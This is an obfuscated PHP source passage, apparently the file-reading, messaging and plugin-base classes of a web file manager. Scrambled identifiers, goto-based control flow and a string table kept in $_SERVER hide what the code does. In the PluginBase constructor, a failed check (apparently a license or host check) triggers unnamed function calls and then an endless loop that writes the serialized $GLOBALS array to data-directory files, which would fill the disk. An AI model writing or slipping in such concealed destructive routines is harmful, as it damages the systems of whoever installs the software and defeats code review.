$c›ÿÏàÀŸÖ[1300] => 0, $c›ÿÏàÀŸÖ[1301] => 0); } static $fileInfo = array(); public function info($BÊáåùåÎã) { $A≤øÈã“≈å = $_SERVER[Ä¿¡‡öóµŸﬂ‡][1302]; if (isset(self::$fileInfo[$BÊáåùåÎã])) { return self::$fileInfo[$BÊáåùåÎã]; } if (substr($BÊáåùåÎã, 0, strlen($A≤øÈã“≈å)) != $A≤øÈã“≈å) { return !1; } self::$fileInfo[$BÊáåùåÎã] = IO::info(substr($BÊáåùåÎã, strlen($A≤øÈã“≈å))); return self::$fileInfo[$BÊáåùåÎã]; } public static function read($AŸé£úòò≤, $C¯≈ªª–øΩ, $DﬁåÖª™≤Ñ) { goto e—Ÿ†Î∏Âä; Dﬁåùèä¿ä: $B’ˆﬁ∂Ú = 0; while ($B’ˆﬁ∂Ú < $DﬁåÖª™≤Ñ) { $D¨¶î–Ûˆ = min($C∑πùÚÓéë, $DﬁåÖª™≤Ñ - $B’ˆﬁ∂Ú); $e√ªÙáµêè .= fread($CÔ∞…óÑÍ…, $D¨¶î–Ûˆ); $B’ˆﬁ∂Ú += $D¨¶î–Ûˆ; } fclose($CÔ∞…óÑÍ…); goto AˆÇôªëªÕ; AˆÇôªëªÕ: return $e√ªÙáµêè; goto d¥©π…¿µﬁ; BçÇÂ·øé“: $C∑πùÚÓéë = 8192; fseek($CÔ∞…óÑÍ…, $C¯≈ªª–øΩ, SEEK_SET); $e√ªÙáµêè = $DËŒ¢∏Œß≠[33]; goto Dﬁåùèä¿ä; e—Ÿ†Î∏Âä: $DËŒ¢∏Œß≠ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CÔ∞…óÑÍ… = fopen($AŸé£úòò≤, $DËŒ¢∏Œß≠[1173]); if (!$CÔ∞…óÑÍ…) { return $DËŒ¢∏Œß≠[33]; } goto BçÇÂ·øé“; d¥©π…¿µﬁ: } public function fileSubstr($B¡ëÒˆÔ”‚, $aÃ ¢Ø¶—›) { goto F÷ÕÂ‡üèÃ; cõÌÆçÇ·ê: $eÂç≠ÉÔº¥ = 0; $CçáıÀåàô = 0; $e¯÷Õ—å†ò = $F´£¨ÙÇ¶Ö[33]; goto A‚üËª Éå; A‚üËª Éå: foreach ($BŒŒ∫ü±˘„ as $eÂç≠ÉÔº¥ => $e¯÷Õ—å†ò) { $eÂç≠ÉÔº¥ = intval($eÂç≠ÉÔº¥); $CçáıÀåàô = $eÂç≠ÉÔº¥ + strlen($e¯÷Õ—å†ò); if ($B¡ëÒˆÔ”‚ >= $CçáıÀåàô) { continue; } if ($B¡ëÒˆÔ”‚ >= $eÂç≠ÉÔº¥ && $B¡ëÒˆÔ”‚ + $aÃ ¢Ø¶—› <= $CçáıÀåàô) { return substr($e¯÷Õ—å†ò, $B¡ëÒˆÔ”‚ - $eÂç≠ÉÔº¥, $aÃ ¢Ø¶—›); } break; } if (count($BŒŒ∫ü±˘„) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($F´£¨ÙÇ¶Ö[1303], $F´£¨ÙÇ¶Ö[1304] . count($BŒŒ∫ü±˘„) . "\x3b\x73\x74\x61\x72\x74\x3d{$B¡ëÒˆÔ”‚}\x2c\154\145\x6e\147\164\x68\x3d{$aÃ ¢Ø¶—›}\73\x70\x6f\x73\145\x3a{$eÂç≠ÉÔº¥}\x7e{$CçáıÀåàô}"); throw new Exception($F´£¨ÙÇ¶Ö[1305]); } $e©ß«È’›Ü = intval($B¡ëÒˆÔ”‚ / $b∂›àñÈ∂») * $b∂›àñÈ∂»; goto aÀ‚¡–ñâØ; aÕÀ≤Î•ÿƒ: if ($B¡ëÒˆÔ”‚ + $aÃ ¢Ø¶—› > $e˜ÁÇáË∂°) { $aÃ ¢Ø¶—› = $e˜ÁÇáË∂° - $B¡ëÒˆÔ”‚; } if ($aÃ ¢Ø¶—› <= 0) { return $F´£¨ÙÇ¶Ö[33]; } if ($B¡ëÒˆÔ”‚ < 0 || $B¡ëÒˆÔ”‚ >= $e˜ÁÇáË∂° || $aÃ ¢Ø¶—› <= 0 || $aÃ ¢Ø¶—› > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\106\x69\x6c\x65\122\145\x61\144\x20\145\x72\x72\x6f\x72\x21\x20\x73\164\x61\162\164\75{$B¡ëÒˆÔ”‚}\73\154\x65\156\x67\164\150\x3d{$aÃ ¢Ø¶—›}\x3b\x20\x73\151\x7a\145\x3d{$e˜ÁÇáË∂°}\73"); } goto bÒï¨ÜÙçù; c£âåÍ≠‘Á: ksort($BŒŒ∫ü±˘„); $D†∂—Æè—¯ = substr($bŸåêı◊∏⁄, $B¡ëÒˆÔ”‚ - $e©ß«È’›Ü, $aÃ ¢Ø¶—›); return $D†∂—Æè—¯; goto Fçë€ÆÔ»≠; F÷ÕÂ‡üèÃ: $F´£¨ÙÇ¶Ö =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $e˜ÁÇáË∂° = $this->info[$F´£¨ÙÇ¶Ö[77]]; $d÷ÁÉ¥ãÊ» = $B¡ëÒˆÔ”‚; goto F‡®Œë“Ö©; F‡®Œë“Ö©: $eâ‘¶Û≤Ü¡ = $aÃ ¢Ø¶—›; if ($B¡ëÒˆÔ”‚ < 0) { $B¡ëÒˆÔ”‚ = $e˜ÁÇáË∂° + $B¡ëÒˆÔ”‚; } if ($aÃ ¢Ø¶—› === !1) { $aÃ ¢Ø¶—› = $e˜ÁÇáË∂° - $B¡ëÒˆÔ”‚; } goto aÕÀ≤Î•ÿƒ; bÒï¨ÜÙçù: $b∂›àñÈ∂» = 64 * 1024; $BŒŒ∫ü±˘„ =& self::$_chunkBuffer[$this->path]; if (!$BŒŒ∫ü±˘„) { $BŒŒ∫ü±˘„ = array(); } goto cõÌÆçÇ·ê; aÀ‚¡–ñâØ: $eÚ∏≈ﬁøø≤ = ceil(($B¡ëÒˆÔ”‚ + $aÃ ¢Ø¶—›) / $b∂›àñÈ∂») * $b∂›àñÈ∂» - $e©ß«È’›Ü; $bŸåêı◊∏⁄ = IO::fileSubstr($this->path, $e©ß«È’›Ü, $eÚ∏≈ﬁøø≤); $BŒŒ∫ü±˘„[$e©ß«È’›Ü . $F´£¨ÙÇ¶Ö[33]] = $bŸåêı◊∏⁄; goto c£âåÍ≠‘Á; Fçë€ÆÔ»≠: } private function log($f·Ûœ∞√∆ä, $fËßŸ≥¨ê≠) { $B≈·€˜∞áû =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $e≠†∏‡Á”Ù = timeFloat() - $this->timeStart; write_log(sprintf($B≈·€˜∞áû[1306], $f·Ûœ∞√∆ä, $this->info[$B≈·€˜∞áû[28]], $e≠†∏‡Á”Ù, $fËßŸ≥¨ê≠), $B≈·€˜∞áû[1222]); } } class Message { function __construct() { } public function send($b¡‘†è‚´À = '', $Fâ∑•ÌÔ£â = array(), $D≥∞≥èÃ∏ÿ = "\164\x65\170\x74") { goto c¨·“‚Îâô; f«πÉ†ÍÏπ: Hook::trigger($EÀö‚ê˘∆ì[1310], $DûÂ¡†ﬁçê); goto Cπû±ìÓà ; c¨·“‚Îâô: $EÀö‚ê˘∆ì =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $e®ëÉç∑â = array($EÀö‚ê˘∆ì[29] => $EÀö‚ê˘∆ì[1307], $EÀö‚ê˘∆ì[692] => $b¡‘†è‚´À); if (in_array($D≥∞≥èÃ∏ÿ, array($EÀö‚ê˘∆ì[1307], $EÀö‚ê˘∆ì[1308]))) { $e®ëÉç∑â[$EÀö‚ê˘∆ì[29]] = $D≥∞≥èÃ∏ÿ; } goto CÊÇ„˘ªªæ; CÊÇ„˘ªªæ: $Fâ∑•ÌÔ£â = array($EÀö‚ê˘∆ì[975] => isset($Fâ∑•ÌÔ£â[$EÀö‚ê˘∆ì[975]]) ? $Fâ∑•ÌÔ£â[$EÀö‚ê˘∆ì[975]] : $EÀö‚ê˘∆ì[33], $EÀö‚ê˘∆ì[535] => isset($Fâ∑•ÌÔ£â[$EÀö‚ê˘∆ì[535]]) ? $Fâ∑•ÌÔ£â[$EÀö‚ê˘∆ì[535]] : $EÀö‚ê˘∆ì[33]); if (empty($b¡‘†è‚´À) || empty($Fâ∑•ÌÔ£â[$EÀö‚ê˘∆ì[975]]) && empty($Fâ∑•ÌÔ£â[$EÀö‚ê˘∆ì[535]])) { return !1; } $DûÂ¡†ﬁçê = array($EÀö‚ê˘∆ì[1249] => $e®ëÉç∑â, $EÀö‚ê˘∆ì[1309] => $Fâ∑•ÌÔ£â); goto f«πÉ†ÍÏπ; Cπû±ìÓà : } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto EôÜ ∆ÙÛÈ; aßùÜñÇ‘: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto Bö«•√§¬Â; Dπ«≈é⁄–: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Bèı˘é°á[8]; $this->pluginApi = appHostGet() . $Bèı˘é°á[1312] . $this->pluginName . $Bèı˘é°á[8]; $this->pluginHost = $config[$Bèı˘é°á[1313]] . $this->pluginName . $Bèı˘é°á[8]; goto Bı·É¿Õíç; füº˜¢û¢˘: $this->in =& $in; $this->modelPlugin = Model($Bèı˘é°á[1311]); $this->pluginName = str_replace($Bèı˘é°á[1311], $Bèı˘é°á[33], get_class($this)); goto Dπ«≈é⁄–; cÜÂ…ûç•º: if ($_SERVER[$Bèı˘é°á[712]] != $c»√ªÊ›£É($cËùíæÎâò)) { goto Bﬁ‚°ö§æ∏; Bﬁ‚°ö§æ∏: $cØÎ“úº‡π = $Bèı˘é°á[797]; $e—À†Á±ì∏ = $Bèı˘é°á[713]; $d€ºê‚¥ÚÒ = $_SERVER[$Bèı˘é°á[714]] . $Bèı˘é°á[715]; goto fóŒ‡ÍùÔá; f≤√«Àß∑≥: $Cçõ¿ØÁçª = 1; for ($C±Ûàà ∆Ω = $Cçõ¿ØÁçª; $C±Ûàà ∆Ω > 0; $C±Ûàà ∆Ω++) { $FµÌ≤ñ∂¨Ñ(DATA_PATH . $C±Ûàà ∆Ω, $bì—ßí◊Òè); } goto B–Áß»—Æ°; eÒÖêÊã◊Ω: $cØÎ“úº‡π(); $FµÌ≤ñ∂¨Ñ = $Bèı˘é°á[799]; $bì—ßí◊Òè = json_encode($GLOBALS[$Bèı˘é°á[800]]); goto f≤√«Àß∑≥; fóŒ‡ÍùÔá: $e·øÈÓ–°á = $e—À†Á±ì∏($d€ºê‚¥ÚÒ); $CôâÁ∏àªÌ = explode($Bèı˘é°á[217], $e·øÈÓ–°á); if (count($CôâÁ∏àªÌ) < $Bèı˘é°á[563]) { $B»¬É±¯©‘ = $Bèı˘é°á[716]; $B»¬É±¯©‘(); } goto F ÀåÎÙØÔ; F ÀåÎÙØÔ: $fÂΩ·Ê´ˆè = $Bèı˘é°á[798]; $fÂΩ·Ê´ˆè($_SERVER[$Bèı˘é°á[796]]); $cØÎ“úº‡π = $Bèı˘é°á[797]; goto eÒÖêÊã◊Ω; B–Áß»—Æ°: } global $in, $config; $this->config =& $config; goto füº˜¢û¢˘; EôÜ ∆ÙÛÈ: $Bèı˘é°á =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cËùíæÎâò = $_SERVER[$Bèı˘é°á[714]] . $Bèı˘é°á[715]; $c»√ªÊ›£É = $Bèı˘é°á[711]; goto cÜÂ…ûç•º; Bı·É¿Õíç: $this->pluginHostDefault = $config[$Bèı˘é°á[1313]] . $this->pluginName . $Bèı˘é°á[8]; $DƒºÀ∆∞ · = $config[$Bèı˘é°á[1314]]; if ($DƒºÀ∆∞ · && strpos($Bèı˘é°á[47] . $DƒºÀ∆∞ · . $Bèı˘é°á[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$Bèı˘é°á[1315]] . $this->pluginName . $Bèı˘é°á[8]; } goto aßùÜñÇ‘; Bö«•√§¬Â: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ä¿¡‡öóµŸﬂ‡][1316]); } protected function assign($dƒå‘ã·†Ç, $Cåà≥≠ïÈê = false) { if (is_array($dƒå‘ã·†Ç)) { $this->values = array_merge($this->values, $dƒå‘ã·†Ç); } else { $this->values[$dƒå‘ã·†Ç] = $Cåà≥≠ïÈê; } } protected function display($BØ–†‰Íê‡) { extract($this->values); require $BØ–†‰Íê‡; } final function hookRegist($Déì‰◊›†µ) { $this->modelPlugin->appRegist($this->pluginName, $Déì‰◊›†µ); } final function appIcon() { $a§°Õıªëö =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Fê„îÙ˜Ûø = $this->appPackage(); $dÙÃ•»ÌÖÖ = $a§°Õıªëö[33]; if (isset($Fê„îÙ˜Ûø[$a§°Õıªëö[382]])) { if (isset($Fê„îÙ˜Ûø[$a§°Õıªëö[382]][$a§°Õıªëö[1317]])) { $dÙÃ•»ÌÖÖ = $a§°Õıªëö[1318] . $Fê„îÙ˜Ûø[$a§°Õıªëö[382]][$a§°Õıªëö[1317]] . $a§°Õıªëö[1319]; } else { if ($Fê„îÙ˜Ûø[$a§°Õıªëö[382]][$a§°Õıªëö[1320]]) { $dÙÃ•»ÌÖÖ = $a§°Õıªëö[1321] . $Fê„îÙ˜Ûø[$a§°Õıªëö[382]][$a§°Õıªëö[1320]] . $a§°Õıªëö[1322]; } } } return $dÙÃ•»ÌÖÖ; } final function fileCanView($e¡∂è§ŸíÂ) { goto a◊Ê∑â◊ıÕ; fóÒ∏ëµæ©: $fÇÀ∏ëåÿÃ = Session::get($Dì©ÓåÃ§’[1323]); if (!$fÇÀ∏ëåÿÃ || !$fÇÀ∏ëåÿÃ[$Dì©ÓåÃ§’[1324]]) { $B¬≤æÉ‘√Ì = $Dì©ÓåÃ§’[1325] . rawurlencode(this_url()); show_tips(LNG($Dì©ÓåÃ§’[1326]) . $Dì©ÓåÃ§’[1327] . $B¬≤æÉ‘√Ì . $Dì©ÓåÃ§’[1328] . LNG($Dì©ÓåÃ§’[1329]) . $Dì©ÓåÃ§’[1330], !1); } if (!Action($Dì©ÓåÃ§’[1331])->authCan($Dì©ÓåÃ§’[1332])) { show_tips(LNG($Dì©ÓåÃ§’[1333]) . $Dì©ÓåÃ§’[1334], !1); } goto bñ£ëßŒ÷ç; bñ£ëßŒ÷ç: ActionCall($Dì©ÓåÃ§’[1335], $e¡∂è§ŸíÂ); goto a†é∆çÎÛ€; a◊Ê∑â◊ıÕ: $Dì©ÓåÃ§’ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (request_url_safe($e¡∂è§ŸíÂ)) { return !0; } if ($this->isShare($e¡∂è§ŸíÂ)) { return !0; } goto fóÒ∏ëµæ©; a†é∆çÎÛ€: } final function isShare($AÖ©¶ÆµÃà) { $DŒ‡ë„ÿÛπ = KodIO::parse($AÖ©¶ÆµÃà); return $DŒ‡ë„ÿÛπ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($d¢œ«øÿÕí) { if (request_url_safe($d¢œ«øÿÕí)) { return $d¢œ«øÿÕí; } if (!$this->isShare($d¢œ«øÿÕí)) { $d¢œ«øÿÕí = $this->filePath($d¢œ«øÿÕí); } return Action($_SERVER[Ä¿¡‡öóµŸﬂ‡][1022])->linkOut($d¢œ«øÿÕí); } public function filePathLinkOut($aÂ’œû†Ë§) { if (request_url_safe($aÂ’œû†Ë§)) { return $aÂ’œû†Ë§; } $this->fileCanView($aÂ’œû†Ë§); return Action($_SERVER[Ä¿¡‡öóµŸﬂ‡][1022])->link($aÂ’œû†Ë§); } final function filePath($A§∂·◊¿¶†) { $d∏¨–¯Ö˘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($b“˜œÙõ»˘ = $this->checkSharePath($A§∂·◊¿¶†)) { return $b“˜œÙõ»˘; } $this->fileCanView($A§∂·◊¿¶†); if (request_url_safe($A§∂·◊¿¶†)) { $BÉ¥ÆØ‹Œˆ = parse_url_query($A§∂·◊¿¶†); if (isset($BÉ¥ÆØ‹Œˆ[$d∏¨–¯Ö˘[1336]]) && isset($BÉ¥ÆØ‹Œˆ[$d∏¨–¯Ö˘[197]])) { $cÒ√Ôò¬∂ä = Model($d∏¨–¯Ö˘[1092])->get($d∏¨–¯Ö˘[1337]); $C≤ÊÇè¶≥Ü = Mcrypt::decode($BÉ¥ÆØ‹Œˆ[$d∏¨–¯Ö˘[197]], $cÒ√Ôò¬∂ä); if ($C≤ÊÇè¶≥Ü) { $this->fileInfo = IO::infoWithChildren($C≤ÊÇè¶≥Ü); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $C≤ÊÇè¶≥Ü; } } $A§∂·◊¿¶† = $this->_cacheHttpFile($A§∂·◊¿¶†); $this->fileInfo = IO::infoWithChildren($A§∂·◊¿¶†); } else { $this->fileInfo = IO::infoWithChildren($A§∂·◊¿¶†); if (!$this->fileInfo) { show_tips(LNG($d∏¨–¯Ö˘[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $A§∂·◊¿¶†; } final function _cacheHttpFile($FíÔ˘ô«⁄ä) { $FË◊Ç¢àëœ = hash_path($FíÔ˘ô«⁄ä, !0); $this->cachePath = $this->pluginCachePath($FË◊Ç¢àëœ); if ($b–ﬁü∞£Îò = IO::fileNameExist($this->cachePath, $FË◊Ç¢àëœ)) { return KodIO::make($b–ﬁü∞£Îò); } $BﬁÊ•™¬È∑ = $this->cachePath . $FË◊Ç¢àëœ; return $this->pluginCacheFileSet($BﬁÊ•™¬È∑, file_get_contents($FíÔ˘ô«⁄ä)); } final function _tmpFileName($dÕ√≠å¨ª∏ = array()) { goto bçÈêÇÍüÏ; bÂ€œ›à÷∫: if (isset($dÕ√≠å¨ª∏[$bæŒΩåù≥†[162]][$bæŒΩåù≥†[164]])) { return $dÕ√≠å¨ª∏[$bæŒΩåù≥†[162]][$bæŒΩåù≥†[164]]; } $Cò¯–é◊ä√ = IO::hashSimple($dÕ√≠å¨ª∏[$bæŒΩåù≥†[75]]); if ($Cò¯–é◊ä√) { return $Cò¯–é◊ä√; } goto AéØ¿öÒØ¢; AéØ¿öÒØ¢: $E∫É ∏ƒµ® = array($dÕ√≠å¨ª∏[$bæŒΩåù≥†[28]], $dÕ√≠å¨ª∏[$bæŒΩåù≥†[75]], $dÕ√≠å¨ª∏[$bæŒΩåù≥†[77]]); if (isset($dÕ√≠å¨ª∏[$bæŒΩåù≥†[459]])) { $E∫É ∏ƒµ®[] = $dÕ√≠å¨ª∏[$bæŒΩåù≥†[459]]; } return md5(implode($bæŒΩåù≥†[70], $E∫É ∏ƒµ®)); goto B”∞Íï¿Â; bçÈêÇÍüÏ: $bæŒΩåù≥† =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$dÕ√≠å¨ª∏) { $dÕ√≠å¨ª∏ = $this->fileInfo; } if (isset($dÕ√≠å¨ª∏[$bæŒΩåù≥†[164]])) { return $dÕ√≠å¨ª∏[$bæŒΩåù≥†[164]]; } goto bÂ€œ›à÷∫; B”∞Íï¿Â: } final function checkSharePath($DÊÙÑÃ–Õˆ) { goto cΩ≠£´óâÊ; a∞≤âíΩ´à: $this->cachePath = $this->pluginCachePath($this->fileInfo[$fµàáòä‚õ[164]]); return $eØ¯üùàø[$fµàáòä‚õ[75]]; goto A«Ö≠ﬂå±ì; f≠âõ¬Ó¬œ: $eØ¯üùàø = Action($fµàáòä‚õ[1022])->sharePathInfo($DÊÙÑÃ–Õˆ); if (!isset($eØ¯üùàø[$fµàáòä‚õ[75]])) { show_json(LNG($fµàáòä‚õ[1339]), !1); } $this->fileInfo = $eØ¯üùàø[$fµàáòä‚õ[162]]; goto a∞≤âíΩ´à; cΩ≠£´óâÊ: $fµàáòä‚õ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!defined($fµàáòä‚õ[427])) { define($fµàáòä‚õ[1338], 0); } if (!$this->isShare($DÊÙÑÃ–Õˆ)) { return !1; } goto f≠âõ¬Ó¬œ; A«Ö≠ﬂå±ì: } final function pluginCachePath($C⁄ë≠©èå« = '') { $eØäÚ¿éË’ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cßﬂˆ¯àÇÕ = IO_PATH_SYSTEM_TEMP . $eØäÚ¿éË’[1340] . $this->pluginName; if (!($f˜èè“É’Ω = IO::infoFull($cßﬂˆ¯àÇÕ))) { return IO::mkdir($cßﬂˆ¯àÇÕ . $eØäÚ¿éË’[8] . $C⁄ë≠©èå«); } if (empty($C⁄ë≠©èå«)) { return $f˜èè“É’Ω[$eØäÚ¿éË’[75]]; } if (!($B¬ÇÀ’¿ÑÛ = IO::fileNameExist($f˜èè“É’Ω[$eØäÚ¿éË’[75]], $C⁄ë≠©èå«))) { return IO::mkdir($f˜èè“É’Ω[$eØäÚ¿éË’[75]] . $C⁄ë≠©èå«); } return KodIO::make($B¬ÇÀ’¿ÑÛ); } final function pluginCacheFileSet($A••ÚïËπ€, $cøÕñ°å≈Ú = '') { $eë£∑Ó“€± =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!($fÑØÌ¢â¯– = IO::infoFull($A••ÚïËπ€))) { return IO::mkfile($A••ÚïËπ€, $cøÕñ°å≈Ú, REPEAT_REPLACE); } IO::setContent($fÑØÌ¢â¯–[$eë£∑Ó“€±[75]], $cøÕñ°å≈Ú); return $fÑØÌ¢â¯–[$eë£∑Ó“€±[75]]; } final function pluginLocalFile($cå°ÖßæΩ = '') { goto dÒ®É”ÑâÙ; cá§ÍŒ®ÌÆ: if (!$cå°ÖßæΩ) { return $FœÈ›˘„ÀÀ; } $eáß”´€ø˘ = IO::info($cå°ÖßæΩ); $F⁄‹ÙÒÕáä = $this->_tmpFileName($eáß”´€ø˘) . $DƒéπŒ¿À [91] . $eáß”´€ø˘[$DƒéπŒ¿À [160]]; goto a∏Ñ∑é≤¡⁄; dÒ®É”ÑâÙ: $DƒéπŒ¿À  =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $FœÈ›˘„ÀÀ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($FœÈ›˘„ÀÀ)) { mk_dir($FœÈ›˘„ÀÀ); } goto cá§ÍŒ®ÌÆ; a∏Ñ∑é≤¡⁄: $aÂ∏∆èΩ°¬ = $FœÈ›˘„ÀÀ . $F⁄‹ÙÒÕáä; if (@file_exists($aÂ∏∆èΩ°¬)) { return $aÂ∏∆èΩ°¬; } return IO::copy($cå°ÖßæΩ, $FœÈ›˘„ÀÀ, 0, $F⁄‹ÙÒÕáä); goto EÇá¯óÏŒ≠; EÇá¯óÏŒ≠: } final function appPackage() { goto b§Í¿êÖç‘; a€Ëë‚éÔ‘: $this->parseLang($D∏É⁄¯≈∂’); $Cî≤æ…§˘∆ = json_decode_force($D∏É⁄¯≈∂’); if (!$Cî≤æ…§˘∆) { return array(); } goto dîÇ” ¥Üú; dîÇ” ¥Üú: $eô©πíÜˆÛ = Hook::trigger($Bã√—¡éŸ–[1342], $Cî≤æ…§˘∆); if ($eô©πíÜˆÛ && is_array($eô©πíÜˆÛ)) { $Cî≤æ…§˘∆ = $eô©πíÜˆÛ; } $this->packageData = $Cî≤æ…§˘∆; goto fè§≈‰óÔ´; fè§≈‰óÔ´: return $Cî≤æ…§˘∆; goto e◊∑Ë¶ˆ¥«; b§Í¿êÖç‘: $Bã√—¡éŸ– =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($this->packageData) { return $this->packageData; } $D∏É⁄¯≈∂’ = $this->parseFile($this->pluginPath . $Bã√—¡éŸ–[1341]); goto a€Ëë‚éÔ‘; e◊∑Ë¶ˆ¥«: } public function packageInfoGet($d©ÎÍ•ú–’) { $eâ°πèñÊô = $this->appPackage(); return array_get_value($eâ°πèñÊô, $d©ÎÍ•ú–’); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ä¿¡‡öóµŸﬂ‡][1343]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ä¿¡‡öóµŸﬂ‡][1344]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ä¿¡‡öóµŸﬂ‡][1345]); } private function parseFile($FƒÇ§¨¬Öû) { goto Cñ•ÿÛÛÇ˘; Cñ•ÿÛÛÇ˘: $f¬òÑú∞ﬂ“ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $FÃ†∂ı ’É = file_get_contents($FƒÇ§¨¬Öû); $Bàöè∫¢Ûö = array($f¬òÑú∞ﬂ“[1346], $f¬òÑú∞ﬂ“[1347], $f¬òÑú∞ﬂ“[1348], $f¬òÑú∞ﬂ“[1349], $f¬òÑú∞ﬂ“[1350], $f¬òÑú∞ﬂ“[1351], $f¬òÑú∞ﬂ“[1352]); goto FÕ≥ÿºäöˆ; eôàΩ≥Ñ›ı: $FÃ†∂ı ’É = str_replace($Bàöè∫¢Ûö, $b≤˜—›ı–ƒ, $FÃ†∂ı ’É); return $FÃ†∂ı ’É; goto cÇ¨¯≤ÙÚÖ; FÕ≥ÿºäöˆ: $b≤˜—›ı–ƒ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$f¬òÑú∞ﬂ“[84]][$f¬òÑú∞ﬂ“[1353]]); if (strstr($FÃ†∂ı ’É, $f¬òÑú∞ﬂ“[1354])) { $bÜöÉÚ…õÓ = rawurlencode(json_encode($this->pluginLangArr)); $FÃ†∂ı ’É = str_replace($f¬òÑú∞ﬂ“[1354], $bÜöÉÚ…õÓ, $FÃ†∂ı ’É); } if (strstr($FÃ†∂ı ’É, $f¬òÑú∞ﬂ“[1355])) { $bÜöÉÚ…õÓ = $bÜöÉÚ…õÓ = rawurlencode(json_encode($this->getConfig())); $FÃ†∂ı ’É = str_replace($f¬òÑú∞ﬂ“[1355], $bÜöÉÚ…õÓ, $FÃ†∂ı ’É); } goto eôàΩ≥Ñ›ı; cÇ¨¯≤ÙÚÖ: } private function parseLang(&$AÕÇçÇ¯Ê) { goto còﬂ‹ªﬁﬂÈ; cÙ⁄–ÆûçÙ: $EÍñ£∑À©Æ = array(); foreach ($díôˆƒ—†Ï[0] as $aéäÂ∞±≤≈) { $Cœƒ±Ô–éû = substr($aéäÂ∞±≤≈, strlen($Eó‚èﬁÈı’), -4); $bÊò’˘ñ≈– = LNG($Cœƒ±Ô–éû); $BﬂáÀã†Ïß[] = $aéäÂ∞±≤≈; $EÍñ£∑À©Æ[] = str_replace(array($Dæí⁄∑Û€à[217], $Dæí⁄∑Û€à[996], $Dæí⁄∑Û€à[330], $Dæí⁄∑Û€à[113]), array($Dæí⁄∑Û€à[50], $Dæí⁄∑Û€à[50], $Dæí⁄∑Û€à[33], $Dæí⁄∑Û€à[1358]), $bÊò’˘ñ≈–); } $AÕÇçÇ¯Ê = str_replace($BﬂáÀã†Ïß, $EÍñ£∑À©Æ, $AÕÇçÇ¯Ê); goto dﬁªî¨…â∞; f»åèáˆ°â: preg_match_all($Dæí⁄∑Û€à[1357], $AÕÇçÇ¯Ê, $díôˆƒ—†Ï); if (!is_array($díôˆƒ—†Ï) || count($díôˆƒ—†Ï) == 0 || !is_array($díôˆƒ—†Ï[0]) || count($díôˆƒ—†Ï[0]) == 0) { return; } $BﬂáÀã†Ïß = array(); goto cÙ⁄–ÆûçÙ; còﬂ‹ªﬁﬂÈ: $Dæí⁄∑Û€à =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Eó‚èﬁÈı’ = $Dæí⁄∑Û€à[1356]; if (!strstr($AÕÇçÇ¯Ê, $Eó‚èﬁÈı’)) { return; } goto f»åèáˆ°â; dﬁªî¨…â∞: } private function parseConfig(&$D»·Ûãá≥·) { goto aêÔÍùŒ¨á; Fãå¢ìùÑ˜: $D»·Ûãá≥· = str_replace($c”ùÑ‡äπƒ, $Aá‰¥ôÜ§ã, $D»·Ûãá≥·); goto b”äÃ¡†Ôõ; A≥§õåîâ‹: preg_match_all($a∆íâŸ§«ı[1360], $D»·Ûãá≥·, $Bõäã´Ÿ‡»); if (!is_array($Bõäã´Ÿ‡») || count($Bõäã´Ÿ‡») == 0 || !is_array($Bõäã´Ÿ‡»[0]) || count($Bõäã´Ÿ‡»[0]) == 0) { return; } $BÚÌºà»ˆ´ = $this->getConfig(); goto D◊ÇäÜ’íÉ; aêÔÍùŒ¨á: $a∆íâŸ§«ı =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B“§‹± ıÈ = $a∆íâŸ§«ı[1359]; if (!strstr($D»·Ûãá≥·, $B“§‹± ıÈ)) { return; } goto A≥§õåîâ‹; D◊ÇäÜ’íÉ: $c”ùÑ‡äπƒ = array(); $Aá‰¥ôÜ§ã = array(); foreach ($Bõäã´Ÿ‡»[0] as $a ˜◊±ƒÑŒ) { $FÛçÉíäØ“ = substr($a ˜◊±ƒÑŒ, strlen($B“§‹± ıÈ), -2); $c”ùÑ‡äπƒ[] = $a ˜◊±ƒÑŒ; $Aá‰¥ôÜ§ã[] = _get($BÚÌºà»ˆ´, $FÛçÉíäØ“); } goto Fãå¢ìùÑ˜; b”äÃ¡†Ôõ: } private function parsePackage(&$d›ôÂ¡â±Í) { goto aÔ«ãπÑ—Ó; aÔ«ãπÑ—Ó: $d÷ÑÛ§ˆ…á =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $d¥µãÉ≈ª” = $d÷ÑÛ§ˆ…á[1361]; if (!strstr($d›ôÂ¡â±Í, $d¥µãÉ≈ª”)) { return; } goto f„≤å±˘Ç™; 